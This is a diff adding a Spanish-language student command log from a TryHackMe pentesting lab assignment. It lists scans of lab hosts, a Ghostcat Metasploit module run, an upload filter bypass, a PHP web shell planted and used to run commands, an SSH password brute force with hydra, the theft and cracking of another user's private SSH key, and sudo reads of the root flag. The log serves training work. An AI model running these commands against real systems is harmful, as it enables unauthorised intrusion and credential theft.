@@ -1,0 +1,53 @@
+# Bitácora de comandos — Actividad A08 (INSECUR S.A. / TryHackMe)
+# Fecha: 07/10/2026 | Alumno: Valentin Moya | Shell: fish
+# Export con redacción de secretos según la guía A08.
+# El detalle por hallazgo está en bitacora/README.md.
+
+$ history | sed -E 's/(password|passwd|token|secret|api[_-]?key)[^ ]*/\1=[REDACTED]/Ig' > bitacora/clase_09_20261007.txt
+
+curl -fsSL https://opencode.ai/v2/install | bash
+sudo pacman -S rust
+sudo pacman -S --needed nmap gobuster nikto hydra seclists metasploit wireshark netcat
+sudo pacman -S --needed nmap gobuster nikto hydra metasploit wireshark-qt openbsd-netcat
+yay -S seclists
+sudo apt update && sudo apt upgrade
+sudo update && sudo upgrade
+sudo apt update
+sudo openvpn --config "/home/valentin/Descargas/us-east-1-valemoyafernandez-regular.ovpn"
+sudo reboot
+sudo modprobe tun\nls -l /dev/net/tun
+cat /home/valentin/TP_THM/bitacora/hydra_jan_dirigida.txt
+nmap -sC -sV -p- 10.67.184.183
+ssh -i /tmp/kay/id_rsa kay@10.67.180.56
+
+---
+# Comandos ejecutados durante la práctica (sesión asistida, redactados)
+# Detalle y salida en bitacora/*.txt y bitacora/README.md
+
+nmap -sC -sV -Pn -oN bitacora/nmap_inicial.txt 10.65.141.11
+nmap -p- --min-rate 5000 -Pn -oN bitacora/nmap_puertos.txt 10.65.141.11
+gobuster dir -u http://10.65.141.11 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o bitacora/gobuster.txt
+smbclient -L //10.65.141.11 -N
+smbclient //10.65.141.11/Anonymous -N -c 'ls; get staff.txt'
+rpcclient -U '' -N 10.65.141.11 -c "lookupnames jan"
+msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 10.65.141.11; run"
+nmap -p- --min-rate 5000 -Pn -oN bitacora/vulnversity_nmap_puertos.txt 10.67.184.183
+nmap -sC -sV -Pn -p21,22,80,139,445,3128,3333 -oN bitacora/vulnversity_nmap_servicios.txt 10.67.184.183
+gobuster dir -u http://10.67.184.183:3333 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 25 -o bitacora/vulnversity_gobuster.txt
+nikto -h http://10.67.184.183:3333 | tee bitacora/vulnversity_nikto.txt
+$ history | sed -E 's/(password|passwd|token|secret|api[_ -]?key)[^ ]*/\1=[REDACTED]/Ig' > bitacora/clase_09_20261007.txt
+# --- Vulnversity: explotación (H-05 / H-06) ---
+for ext in txt gif php html phtml; do echo -n ".$ext -> "; curl -s -o /dev/null -w '%{http_code}\n' -F "file=@/tmp/t.$ext" -F submit=Submit http://10.67.184.183:3333/internal/index.php; done
+curl -F "file=@cmd.phtml" -F "submit=Submit" http://10.67.184.183:3333/internal/index.php
+curl -s "http://10.67.184.183:3333/internal/uploads/cmd.phtml?c=id"
+curl -s "http://10.67.184.183:3333/internal/uploads/cmd.phtml?c=cat%20/home/bill/user.txt"
+
+# --- Basic Pentesting: explotación y post (H-07 / H-08 / H-09) ---
+rpcclient -U '' -N 10.67.180.56 -c "enumdomusers"
+hydra -l jan -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 4 -f ssh://10.67.180.56 -o bitacora/hydra_jan_dirigida.txt
+scp -i /tmp/kay/id_rsa jan@10.67.180.56:/home/kay/.ssh/id_rsa /tmp/kay/id_rsa
+ssh2john /tmp/kay/id_rsa > /tmp/kay/id_rsa.john
+cat /home/kay/pass.bak
+printf '%s\n' '[REDACTED-PASSWORD]' | sudo -S -p '' id
+printf '%s\n' '[REDACTED-PASSWORD]' | sudo -S -p '' cat /root/flag.txt
+sha256sum /root/flag.txt
